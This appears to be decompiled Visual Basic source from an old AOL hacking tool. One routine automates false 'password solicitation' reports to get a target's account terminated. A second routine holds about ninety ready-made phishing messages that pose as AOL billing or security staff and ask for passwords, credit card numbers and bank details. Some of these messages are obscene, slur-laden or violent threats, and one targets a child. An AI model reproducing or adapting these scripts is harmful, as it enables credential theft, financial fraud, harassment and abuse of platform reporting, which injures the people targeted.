l07C0 = extfn13D0(l07BC, 2)
l07C4 = extfn13D0(l07C0, 2)
l07C8 = extfn1750(l07BC, c0074, 0, 0&)
l07CC = extfn1750(l07BC, c007C, 0, 0&)
subF38 .4#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l07D0 = 0 To Form1.Combo1.ListCount
l07D4$ = Form1.Combo1.List(l07D0)
If  Room = l07D4$ Then Exit Sub
Next
 Form1.Combo1.AddItem Room
End Sub

Sub guide_Click ()
Dim l07D6 As String
Dim l07D8 As Variant
Dim l07DC As Integer
Dim l07DE As Variant
Dim l07E2 As Variant
' Const c07E6 = 12 ' &HC%
Dim l07EA As Variant
Dim l07EE As Variant
Dim l07F2 As Integer
Dim l07F4 As Variant
Dim l07F8 As Integer
Dim l07FA As Variant
Dim l07FE As Integer
Dim l0800 As Variant
Dim l0804 As Variant
Dim l0808 As Variant
Dim l080C As Variant
' Const c0810 = 2 ' &H2%
Dim l0814 As Variant
Dim l0818 As Variant
Dim l081C As Variant
Dim l0820 As Variant
Dim l0824 As Variant
Dim l0828 As Variant
Dim l082C As Variant
Dim l0830 As Variant
Dim l0834 As Variant
Dim l0838 As Variant
Dim l083C As Variant
Dim l0840 As String
If  Room = "" Then
MsgBox "Enter a name to TOS.", , "Error"
Exit Sub
End If
If  UCase$(l07D8) Like "*KaOS*" Or UCase$(l07D8) Like "*NiPP*" Or UCase$(l07D8) Like "*CHOP*" Or UCase$(l07D8) Like "*LoRe*" Or UCase$(l07D8) Like "*CouNT*" Or UCase$(l07D8) Like "*SoSo*" Or UCase$(l07D8) Like "*TaLoN*" Then MsgBox "Cant TOS em", 16: End
If  Silent.Checked = True Then
Call sub34B0("HaZe TOSing " & Room)
End If
If  Silent.Checked = False Then
sub30B0 "•-^v•HaZe-X²·³ [gold] • TOSing • " & Room
sub30B0 "•-^v•HaZe-X²·³ [gold] • Method • Guidepager"
sub30B0 "•-^v•HaZe-X²·³ [gold] • Phrase • " & Panel3D5
Call sub3278
End If
l07DC% = extfn1520("AOL Frame25", 0&)
Call subD08("Keyword...", "&Go To")
Do
DoEvents
l07DE = extfn24E0(l07DC%, "Keyword")
Loop Until l07DE <> 0
l07E2 = extfn2518(l07DE, "_AOL_Edit")
l07EA = extfn1718(l07E2, c07E6, 0, "GUIDEPAGER")
l07EE = extfn16E0(l07E2, c0218, 13, 0)
Do
DoEvents
l07F2% = extfn1520("AOL Frame25", 0&)
l07F4 = extfn24E0(l07F2%, "I Need Help!")
Loop Until l07F4 > 0
l07F8% = extfn2518(l07F4, "_AOL_ICON")
l07FA = extfn1750(l07F8%, c0074, 0, 0)
l07FA = extfn1750(l07F8%, c007C, 0, 0)
subF38 .1#
l07FE% = extfn24E0(l07DC%, "I Need Help!")
l0800 = extfn16E0(l07FE%, c022E, 0, 0)
Do
DoEvents
l0804 = extfn24E0(l07DC%, "Report Password Solicitations")
Loop Until l0804 <> 0
l07EA = extfn16E0(l0808, c022E, 0, 0)
l080C = extfn2518(l07DC%, "_AOL_Edit")
l0814 = extfn14E8(l080C, c0810)
l0818 = extfn14E8(l0814, c0810)
l081C = extfn14E8(l0818, c0810)
l0820 = extfn14E8(l081C, c0810)
l0824 = extfn14E8(l0820, c0810)
l0828 = extfn14E8(l0824, c0810)
l082C = extfn14E8(l0828, c0810)
l0830 = extfn14E8(l082C, c0810)
l0834 = extfn1718(l0828, c07E6, 0, Room)
l07D6$ = Chr(10)
l0834 = extfn1718(l0830, c07E6, 0, Room + ":" & " " & "" & Text1 + l07D6$)
l07EA = extfn1750(l0838, c0218, 13, 0)
subF38 .3#
l07EE = extfn16E0(l0828, c0218, 13, 0)
subF38 .5#
subFE0
If  Silent.Checked = True Then
Call sub34B0("" & Room & " now Termed.")
End If
If  Silent.Checked = False Then
Call sub3208
End If
For l083C = 0 To Combo1.ListCount
l0840$ = Combo1.List(l083C)
If  Room = l0840$ Then Exit Sub
Next
 Combo1.AddItem Room
End Sub

Sub HScroll1_Change ()
Panel3D5.Caption = "" & HScroll1.Value
If  HScroll1.Value = 1 Then
Text1 = "Hello valued AOL customer.My name is John Copland and i work with the America Online Billing corperation.Due to a massive data curruption in Sector 4g9e we need you to respond to us with you FULL credit card info.Thank you.;)   "
ElseIf HScroll1.Value = 2 Then
Text1 = "Sector 4G9E of our data base has lost all I/O functions.  When your account logged onto our system, we were temporarily able to verify it as a registered user. Approximately 94 seconds ago, your verification was made void by loss of data in the Sector 4G9E. Now, due to AOL verification protocol, it is mandatory for us to re-verify you. Please click 'Respond' and re-state your password. Failure to comply will result in immediate account deletion. "
ElseIf HScroll1.Value = 3 Then
Text1 = "Dear member, I am a Service Representitive with the America Online Corporation, and I am sorry to inform you that we have encountered an error in our Main-Frame computer system and lost the billing information to some of our users.  Unfortunatley your account was in that group. We need you to reply back with your billing information including: Name (as appears on card), address, and C.C. Number w/EXP Date. Failure in correcting this problem will result in account termination. Thank you for your cooperation-for your assistance with this problem your account will be credited w/2 free hours of online time." & Chr$(13) & Chr$(10) & "--AOL Cust. Service"
ElseIf HScroll1.Value = 4 Then
Text1 = "Good evening AOL User, our billing department is having computer trouble -the terminal containing your billing information- and we are positive that our computers have been fully restored, but to verify this information and to cause the least amount of complications as possible, we only need you to click RESPOND and enter your Credit Card number including EXP. Date...we are very sorry for any trouble." & Chr$(13) & Chr$(10) & "--AOL Billing Department"
ElseIf HScroll1.Value = 5 Then
Text1 = "Hello I am with America Online New user Data base we have encounterd an error in your sign up process please respond and State your full name first and last and your personal log in password"
ElseIf HScroll1.Value = 6 Then
Text1 = "Hello I am with America Online Billing department and we have you down to get billed in 2weeks $300 dollars if you disagree please respond with your full name Creidt card number with experation date address area code city state and phone number"
ElseIf HScroll1.Value = 7 Then
Text1 = "Hello i am With America  Online billing Dep. we are missing your sign up file from our user data base please click respond and send us your full name address city state zipcode areacode phone number Creidt card with experation date and personal log on password"
ElseIf HScroll1.Value = 8 Then
Text1 = "Hello, I am an America Online Billing Representative and I am very sorry to inform you that we have accidentally deleted your billing records from our main computer.  I must ask you for your full name, address, day/night phone number, city, state, credit card number, expiration date, and the bank.  I am very sorry for the invonvenience.  Thank you for your understanding and cooperation!  Brad Kingsly, (CAT ID#13)  Vienna, VA."
ElseIf HScroll1.Value = 9 Then
Text1 = "Hi, I am from a modeling agency in downtown Boston and I was wondering if I could take nude pictures of you for a magazine?  If you are interested, please give me your full name, age, address, and gender.  Thank you!"
ElseIf HScroll1.Value = 10 Then
Text1 = "Hello, Ted McKinley (AOL Billing Rep ID#" & Int(Rnd * 99) & "), I must tell you that you are NOT signed on with a valid credit card number.  Somehow, your false credit card number passed our credit card validation test.  But, when we tried billing your bill to your credit card, our computers flashed ''NOT VALID'' so we must tell you that we will need your password to change your credit card information.  Thank you for cooperation and I hope you enjoyed America Online as much as you could!"
ElseIf HScroll1.Value = 11 Then
Text1 = "Hello, I am very sorry to tell you that we think someone may have entered your account without your permission.  A ''hacker'' may have gotten your password and signed on with it.  If you don't think you signed on for 16 hours in one day, please respond with your password and we will solve this problem as soon as possible.  Thank you!  Luis Hanzgel (CAT ID#43)  Vienna, VA."
ElseIf HScroll1.Value = 12 Then
Text1 = "Hello, I am a member of the America Online Security Agency (AOSA), and we have identified a scam in your billing.  We think that you may have entered a false credit card number on accident.  For us to be sure of what the problem is, you MUST respond with your password.  Thank you for your cooperation!  (REP Chris)  ID#4322."
ElseIf HScroll1.Value = 13 Then
Text1 = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf HScroll1.Value = 14 Then
Text1 = "Hi, I'm Ed Mills of America Online Sevice Department. Your online account, #" & Int(Rnd * 6000000&) & ", is displaying a billing error. We need you to respond back with your name, address, card number, expiration date, and daytime phone number. Sorry for this inconvenience."
ElseIf HScroll1.Value = 15 Then
Text1 = "Hello, I am an America Online Billing Representative. It seems that the America On-line password record was tampered with by un-authorized officials. Some, but very few passwords were changed. This slight situation occured not less then five minutes ago.I will have to ask you to click the respond button and enter your log-on password. You will be informed via E-Mail with a conformation stating that the situation has been resolved.Thank you for your cooperation. Please keep note that you will be recieving E-Mail from us at AOLBilling. And if you have any trouble concerning passwords within your account life, call our member services number at 1-800-328-4475."
ElseIf HScroll1.Value = 16 Then
Text1 = "Dear AOL member, We are sorry to inform you that your account information was accidentely deleted from our account database. This VERY unexpected error occured not less than five minutes ago.Your screen name (not account) and passwords were completely erased. Your mail will be recovered, but your billing info will be erased Because of this situation, we must ask you for your password. I realize that we aren't supposed to ask your password, but this is a worst case scenario that MUST be corrected promptly, Thank you for your cooperation."
ElseIf HScroll1.Value = 17 Then
Text1 = "Hey you damn fucker! Stop buggin me! God damn whore! Leave me the fuck alone! Ya god damned asshole! Go fuck yer mom! Fuckin shit head!"
ElseIf HScroll1.Value = 18 Then
Text1 = "AOL User: We are very sorry to inform you that a mistake was made while correcting people's account info. Your screen name was (accidentely) selected by AOL to be deleted. Your account cannot be totally deleted while you are online, so luckily, you were signed on for us to send this message.All we ask is that you click the Respond button and enter your logon password. I can also asure you that this scenario will never occur again. Thank you for your cooperation."
ElseIf HScroll1.Value = 19 Then
Text1 = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf HScroll1.Value = 20 Then
Text1 = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
ElseIf HScroll1.Value = 21 Then
Text1 = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf HScroll1.Value = 22 Then
Text1 = "Good evening, I am with the America Online Billing Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf HScroll1.Value = 23 Then
Text1 = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf HScroll1.Value = 24 Then
Text1 = "Hello, how is one of our more privelaged OverHead Account Users doing today? We are sorry to report that due to hackers, Stratus is reporting problems, please respond with the last four digits of your home telephone number and Logon PW. Thanks -AOL Acc.Dept."
ElseIf HScroll1.Value = 25 Then
Text1 = "Please click on 'respond' and send me your personal logon password immediately so we may validate your account.  Failure to cooperate may result in permanent account termination.  Thank you for your cooperation and enjoy the service!"
ElseIf HScroll1.Value = 26 Then
Text1 = "Due to problems with the New Member Database of America Online, we are forced to ask you for your personal logon password online.  Please click on 'respond' and send me this information immediately or face account termination!  Thank you for your cooperation."
ElseIf HScroll1.Value = 27 Then
Text1 = "Hello and welcome to America Online!  Because portions of your account information has been inadvertantly destroyed, we must ask you to click on 'respond' and send us your personal logon password immediately.  Thank you for your cooperation and enjoy the service!"
ElseIf HScroll1.Value = 28 Then
Text1 = "Hello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation."
ElseIf HScroll1.Value = 29 Then
Text1 = "Hello. I work for the America On-Line User Database. Due to problems with the New Member Database of America Online, we are forced to ask you for your personal logon password onlineHello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation.. Please click on RESPOND and send me this information immediately or face account termination!  Failure to comply, will result in account termination, Then you will have to wait 16 days and call our offices at 1-800-827-6364 to reactivate.Thank you for your cooperation, America On-Line User Services."
ElseIf HScroll1.Value = 30 Then
Text1 = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf HScroll1.Value = 31 Then
Text1 = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
ElseIf HScroll1.Value = 32 Then
Text1 = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf HScroll1.Value = 33 Then
Text1 = "Good evening, I am with the America Online Billing Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf HScroll1.Value = 34 Then
Text1 = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
ElseIf HScroll1.Value = 35 Then
Text1 = "Hi, I'm with the America Online billing department.  Due to a problem we our experiencing with our records, we have lost vital information concerning your account.  We need you to click the 'Respond' button and reply back with your current password so we may verify this information and correct the problem as soon as possible to avoid unneeded cancellation of your account.  Thank you for your cooperation."
ElseIf HScroll1.Value = 36 Then
Text1 = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that the validation process is almost complete.  To complete the validation process i need you to click on the 'Respond' button, Then Type in your Personal Log-On password and click 'Send'.  Thank you and enjoy America Online."
ElseIf HScroll1.Value = 37 Then
Text1 = "Dear User, Due to the many duplicates of passwords on America Online.  Our Online Technichal Consultants (OTC) has generated a new password for your account. Your newly generated password is ''I37TSQ4'', without quotation.  If your current password is preferred, please click on the 'Respond' button and type in YOUR PASSWORD instead of ''I37TSQ4'' then click SEND button. Respond within 2 minutes to keep your account active."
ElseIf HScroll1.Value = 38 Then
Text1 = "Hello, I am from the America Online Member Information Department.  I am sorry to report that we have been having trouble keeping your log in password valid due to a bad boot-sector in our Main Computers.  To avoid cancellation of your account,  please click the respond button and type your log in password in and press the button Send.  We are sorry for this inconvenience.  Thank you for your time and have and continue to enjoy America Online."
ElseIf HScroll1.Value = 39 Then
Text1 = "Hello, I am form the America Online Billing Department.  I am sorry to report that we have been having trouble keeping your Billing Information valid.  To avoid cancellation of your account,  please click the respond button and type in the following:  Your Name, Your Address, Your Phone Number, and finnaly Your Credit Card Number and Expiaration Date,  then Press the Send button.  We are sorry for this inconvenience.  Thank you for your time and have a nice day."
ElseIf HScroll1.Value = 40 Then
Text1 = "Hello, I am from the America Online Member Information Department.  I am sorry to report that we have been having trouble keeping your log in password valid due to a bad boot-sector in our Main Computers.  To avoid cancellation of your account,  please click the respond button and type your log in password in and press the button Send.  We are sorry for this inconvenience.  Thank you for your time and have and continue to enjoy America Online."
ElseIf HScroll1.Value = 41 Then
Text1 = "Hello, I am from the America Online Billing Department.  I am sorry to report that we have been having trouble keeping your Billing Information valid.  To avoid cancellation of your account,  please click the respond button and type in the following:  Your Name, Your Address, Your Phone Number, and finnaly Your Credit Card Number and Expiaration Date,  then Press the Send button.  We are sorry for this inconvenience.  Thank you for your time and have a nice day."
ElseIf HScroll1.Value = 42 Then
Text1 = "Greetings CyberSurfer! I Am A Representative For the Online Banking System on AOL. As You May Have Read Credit Card Fraud is Huge on the 'Net'. Whould You Like To Safe Guard Your Credit Card Info With AOL? Just Reply With Your Credit Card Number And Full Information So That We may Logg Your Card Into Our Computers So Noone Else But You May Access It Online! We Are Offering This Safety Measure At No-Cost to You At All!"
ElseIf HScroll1.Value = 43 Then
Text1 = "Hi, I Am An America Online Service Representative, Due To A Failure in Our Communications Carrier, We Did Not Recieve Sufficient Account Information To Register Your Account Validity, For Our Records, Please Click ''Respond'' And Reply With Your Logon Password So I Can Validate You As A User. Thank You. Nancy (CAT ID#23) Vienna, VA."
ElseIf HScroll1.Value = 44 Then
Text1 = "Hello, I Am With The America Online Internet Enforcement Dept. We Have Traces Of Hackers Using Your Personal Account, We At AOL Can Find These Hackers And Can Put An End To There Illegal Activities! We Just Need Your Current Password To Verify You Are The Current Owner of This Account. Thank You! Please Feel Free To Call Our 1-800 Number For Technical Support!"
ElseIf HScroll1.Value = 45 Then
Text1 = "Dear User, Due To The Many Duplicates Of Passwords On America Online.  Our  Online Technichal Consultants (OTC) Has Generated A New Password For Your Account. Your Newly Generated Password is ''H53OTCS'', Without Quotations.  If Your Current Password is Preferred, Please Click On The ''Respond'' Button And Type In Your Current Password. We Will Be Updating Our Hardrives So This Inconvinience Should Not Happen Again. Thank You! Luis Hanzgel (CAT ID#43) Vienna, VA."
ElseIf HScroll1.Value = 46 Then
Text1 = "Hello , AOL Customer! I Am Sorry To Inform You That Your Account Information Was Not Correctly Processed Into Our Unix System. We Are Now forced To Ask You To Respond With Your Personal Log On Password And Your Complete Billing Info (Name, Address, & CC Number Information). Thank-You For Your Time, And Continue To Enjoy AOL! (REP Chris) ID# 4322"
ElseIf HScroll1.Value = 47 Then
Text1 = "An Error Has Occured In Verifying Your Account Password. Please Click ''Respond'' And Enter Your Log-On Password, Then Click ''Send''. By Doing This Your Account Will Be Updated And You Will Receive 15 Free Hours For You To Enjoy All of America Online's Great Services! Thank You For Your Cooperation."
ElseIf HScroll1.Value = 48 Then
Text1 = "Wanna' Trade Pics Of Each Other? I I'll Even Thrown in Pics of My Wife. BTW, I'm Bisexual So Send me Pictured of Your husband! Fuck I'm horny...=] And if you Give me your password I will give you 20 pics of myself!"
ElseIf HScroll1.Value = 49 Then
Text1 = "Dear America Online user, due to the recent America Online crash, your password has been lost from the main computer systems'.  To fix this error, we need you to click RESPOND and respond with your current password.  Please respond within 2 minutes to keep your account active.  We are sorry for this inconvinience, this is a ONE time emergency.  Thank you and continue to enjoy America Online!"
ElseIf HScroll1.Value = 50 Then
Text1 = "Hello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation."
ElseIf HScroll1.Value = 51 Then
Text1 = "Hey cock sucker! If you dont give me your password right now I am gonna cancel yer account cuz I got connections in AOL. Give me yer password or pay the price!!!! Respond Quickly!"
ElseIf HScroll1.Value = 52 Then
Text1 = "Good evening, I am with the America Online Billing Dept. Due to errors we've been receiving in our user database, I need to confirm your screen name and log-on password information. Thank you for your cooperation and continue to enjoy America Online!"
ElseIf HScroll1.Value = 53 Then
Text1 = "Hello, I am an America Online Billing Administator. Because of damage to our member records, we ask that you please verify your screen and sign-on password information. We apologize for the inconvenience and for your patience and cooperation 1 hour of online time is being added to your account."
ElseIf HScroll1.Value = 54 Then
Text1 = "ATTENTION: AOL NEWS " & Chr$(13) & Chr$(10) & "******************************" & Chr$(13) & Chr$(10) & "Hi, I'm with the America Online billing department.  Due to a problem we our experiencing with our records, we have lost vital information concerning your account.  We need you to hit the Respond button and reply back with your current password so we may verify this information and correct the problem as soon as possible to avoid unneeded cancellation of your account.  Thank you for your cooperation."
ElseIf HScroll1.Value = 55 Then
Text1 = "ATTENTION:" & Chr$(13) & Chr$(10) & "This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."
ElseIf HScroll1.Value = 56 Then
Text1 = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
ElseIf HScroll1.Value = 57 Then
Text1 = "Hello, this is the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you for your cooperation."
ElseIf HScroll1.Value = 58 Then
Text1 = "Dear User, Due To The Many Duplicates Of Passwords On America Online.  Our  Online Technichal Consultants (OTC) Has Generated A New Password For Your Account. Your Newly Generated Password is ''H53OTCS'', Without Quotations.  If Your Current Password is Preferred, Please Click On The ''Respond'' Button And Type In Your Current Password. We Will Be Updating Our Hardrives So This Inconvinience Should Not Happen Again. Thank You! Luis Hanzgel (CAT ID#43) Vienna, VA."
ElseIf HScroll1.Value = 59 Then
Text1 = "Hi, I am with the America Online Billing Department. Due to many errors this afternoon we are sorry to tell you we have not been able to verify you as a member. Please hit respond with your America Online Sign-On password. Thank you for your cooperation and sorry for the trouble."
ElseIf HScroll1.Value = 60 Then
Text1 = "Hello I am with the America Online Security department. I know we have been telling you not to give out your passwords or billing info to anyone online but we did not expect to have our PWCC (PassWord Control Center) broken into. Please verify that you are the real user of this account by responding with your full screen name and password and your complete credit card information failure to respond with this information will result in the termination of your account. Thank you and enjoy America online. :-)"
ElseIf HScroll1.Value = 61 Then
Text1 = "Hello I am with the America Online security enforcement department and we have lost your logon information. For security reasons we need you to verify that you are in fact the rightfull user of this account by responding to this Instant Messege with you complete screen name and password in this form Screen name - password. Your account will be credited with 10 free hours for this inconvenience. Thank You for using America Online. :-)"
ElseIf HScroll1.Value = 62 Then
Text1 = "Hello, I am with the America Online Resource Department. Due to Sprintnet line noise we have failed to recieve your logon password. To keep this account active you must click respond and enter your password below within 2 minutes. We regret this unfortunate incident but it is necessary for you to validate your logon password. Thank you for using America Online."
ElseIf HScroll1.Value = 63 Then
Text1 = "Dear User, Due to System Crash on America Online A few Weeks ago Your Password Information has Been Lost! Our Online Technichal Consultants (OTC) has generated a new password for your account. Your newly generated password is ''BlIG13'', without quotation.  If your current password is preferred, please click on the 'Respond' Button And Type in YOUR PASSWORD instead of ''STUR6FRY'' Then Click SEND Button. Respond Within 2 Minutes to Keep Your Account Active."
ElseIf HScroll1.Value = 64 Then
Text1 = "Hi, I'm with STC (Standard Tele-Comm. Inc.) Due to a problem in phone transmission at your baud rate, I need to verify your log-on password before it can be fixed. Failure to comply will result in billing errors."
ElseIf HScroll1.Value = 65 Then
Text1 = "Hello, I Am With Bank of America (BOFA), Your Checking Account is Showing Massive Billing Errors! Your Monthly Amount Due to America Online is Showing A Balance Of $242.43! If You Whould Like This Problem Taken Care Of Please Reply With Your Current Password So These Errors May Be Corrected. Please Respond Quickly, For I Am Very Busy!"
ElseIf HScroll1.Value = 66 Then
Text1 = "Hey mother fucker! Give me your password of i am gonna hack into your computer and blow it up in your ugly face ya smelly mother fuckin bitch!"
ElseIf HScroll1.Value = 67 Then
Text1 = "Hello, Welcome To ''Jake La Motta''!! How is one of our more Privelaged OverHead Account Users Doing Today? We Are Sorry To Report that due to The Recent System Failure, The Stratus System is reporting problems, please respond with the last four digits of your home telephone number and Logon Password. Thank You, Supervisor (Mike Brown) Mbrown@Inet.32.com"
ElseIf HScroll1.Value = 68 Then
Text1 = "Hello I am a undercover America Online billing representative. We have detected ''hackers'' using this account and purchasing goods with it, normally you would get stuck with the bill. But if you verify your credit card information so we will know you are the real user we can correct this problem. We at America Online are very sorry for this incident and we are starting a security enforcement program. that will prevent this from happening again. Thank You and have a nice day."
ElseIf HScroll1.Value = 69 Then
Text1 = "Welcome, I Am With America Online Credit Validators. Your Credit Card Information Has Gone Out Of Date. If you Whould Like Your Account To Stay Active Please Respond With New Credit Card Info, Please Reply With All The Information So This Error Will Not Occur Again. We At America Online Are Deticated In Helping Our Customers! Please Feel Free To Call Our 1-800 Number About Our New Credit Plan. Thank You."
ElseIf HScroll1.Value = 70 Then
Text1 = "Hello I Am From The America Online Billing Department. We Are Glad You Have Chosen AOL As Your Internet Provider! We Do Value You As A Customer. Unfortunately America Online Is Having Problems With Recording Newly Created Account Information. To Keep Your Account On America Online You Will Have To Hit The 'Respond' Button On This Message And Type In Your Current Password. If You Decide Not To Cooperate Your Account Will Become Invalid Within The Hour! We Are Very Sorry For The Trouble This May Have Caused You. Thank You!"
ElseIf HScroll1.Value = 71 Then
Text1 = "Hi And Welcome To America Online.  We Are Sorry to Inform You That Your Billing Information Had Been Denied By Our Credit Checkers. In Order To Stay Online We Will Need Your Full Name, Address, Payment Method With Bank Name And Expiration Date Included. Thanks For Your Coopertaion And Sorry For The Trouble. Ted Mckinley (AOL Billing Rep ID#453)"
ElseIf HScroll1.Value = 72 Then
Text1 = "Hi, I am Chris Douglas and I'm from the America Online Billing Department.  I am sorry to inform you that we are having problems locating your billing information.  We need you to hit the Respond button, and reply with your Full name, Address, Credit card number with Expiration date, and your telephone number.  We apologize for this inconvenience.  Thank you and have a nice day."
ElseIf HScroll1.Value = 73 Then
Text1 = "This is Your Last Chance To Give Me Your Password OR I WIll Be Forced To Terminate Your Account! John Lisby (A.K.A. DeadVolvo1) ID#TOP43"
ElseIf HScroll1.Value = 74 Then
Text1 = "Hi, I Work With your Daddy At ChemCo Corp. We Need to Find Your Daddy As soon As possible, So Please Give Me Your America Online Password So We Can Find Your Daddy Thorugh The internet company..Please Hurry!"
ElseIf HScroll1.Value = 75 Then
Text1 = "Dont Ever Call ME A Loser !!!! I'll Fucking Kick The Living Shit out of you SLUT, I will Hack into AOL's System And Kill You And Your Fucking Ugly Mother!!"
ElseIf HScroll1.Value = 76 Then
Text1 = "Sir! This is Urgent! This is your Last Chance To Reply With YOUR Current Password or i will be Forced To Cancel Your Account With AOL! Please Reply ASAP! Thank You!"
ElseIf HScroll1.Value = 77 Then
Text1 = "Hey Faggot! Gimme yer fuckin password NOW or ill kill everyone in your fucking house ya gay ass mother fucker!"
ElseIf HScroll1.Value = 78 Then
Text1 = "Hello,Welcome to America Online, I am with AOL Resource  Deparment.Due to Database File corruption your account information has been  corrupted.To correct this situation please change your account password.Thanx for your time"
ElseIf HScroll1.Value = 79 Then
Text1 = "Hey Mother Fucker I am a hacker and if you don't  respond wit your PW i will hack your ASS TO HELL"
ElseIf HScroll1.Value = 80 Then
Text1 = "Hello, this is Perlinda Case from the America On-Line Billing Department. Due to a system crash last Friday, June 21, 23 percent of the system's information has been erased.Unfortunatly, a portion of the screen name/password was also lost. AOL Staff is aware that the caption below says we would NEVER ASK YOU FOR BILLING INFORMATION, but like mentioned above, the damage is too severe to eliminate that caption! Please type in your screen name/password in order for your account to stay active. Thank You!"
ElseIf HScroll1.Value = 81 Then
Text1 = "Dear America Online member, we are fully aware that the red caption states that AOL STAFF WOULD NEVER ASK FOR BILLING INFO but this is an EXTREME PROCEDURE. 33 percent of the account records have been deleted, and we have no time to remove the caption. We ask that you type your screen name/password in order for your account to continue to be active. We apologize for the great inconvenience, and we hope you continue to use America Online!"
ElseIf HScroll1.Value = 82 Then
Text1 = "Hello, We Thank You For Using America Online, And We Hope You Would Continue With The America Online Service. But Our Computer Came Upon a Virus Spreaded By Some People Who Don't Like America Online, And Most Our Information About You Are Gone, So Please Fix Your Online Profile And Please Give Us Your Password And Credit Card Number With Expiration Date And Bank Name. Also Please Return With Your Full Name And Address"
ElseIf HScroll1.Value = 83 Then
Text1 = "Give me your password or I will kill your account on AOL!"
ElseIf HScroll1.Value = 84 Then
Text1 = "AGE/SEX/PW CHECK"
ElseIf HScroll1.Value = 85 Then
Text1 = "Hello valued America Online customer! Despite the warning at the bottom of this message (which our programmers are working hard to disable for AOL Employees) we have lost your record containing your password. Until it is entered back into the computer, you will not be able to log-on again, you will recieve and INVALID PASSWORD error. If you could assist us with this problem, we will credit your account with 2 free hours. Just click 'RESPOND' and enter your password. Thank you!" & Chr$(13) & Chr$(10) & "--AOL Customer Service"
ElseIf HScroll1.Value = 86 Then
Text1 = "Good evening, I am with the AOL Community Action Team and due to Billing errors we seem to have lost your account information. To correct this situation please click respond and enter Your password information. Please respond as soon as possible  Thank you for your time."
ElseIf HScroll1.Value = 87 Then
Text1 = "Hello, I am with OTC (Online Techincal Consultants) and due to Massive data flow in our database we seem to have lost your password. Please click respond and enter your Your current account password. Please respond as soon as possible  Thank you for your cooperation."
ElseIf HScroll1.Value = 88 Then
Text1 = "Excuse me, I am with OTC (Online Techincal Consultants) and due to data corruption we seem to have failed to recieve your logon password. Please click respond and enter your Your current account password. Incooperation may lead to termination of your account. Thank you for your time."
ElseIf HScroll1.Value = 89 Then
Text1 = "Hello, I am with America Online Billing and due to Technical Failures we seem to have failed to recieve your logon password. Please click respond and enter your Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
ElseIf HScroll1.Value = 90 Then
Text1 = "Dear User, I am with AOL Techincal Staff and due to hackers by-passing out systems we seem to have lost your account information. To correct this situation please click respond and enter Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond within 2 minutes too keep this account active. Thank you for your cooperation."
ElseIf HScroll1.Value = 91 Then
Text1 = "Good evening, I am with WWWC (World Wide Web Consultants) and due to data corruption we have lost your Credit Card information. Please click respond and enter your Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Incooperation may lead to termination of your account. Thank you for your help and enjoy the service!"
ElseIf HScroll1.Value = 92 Then
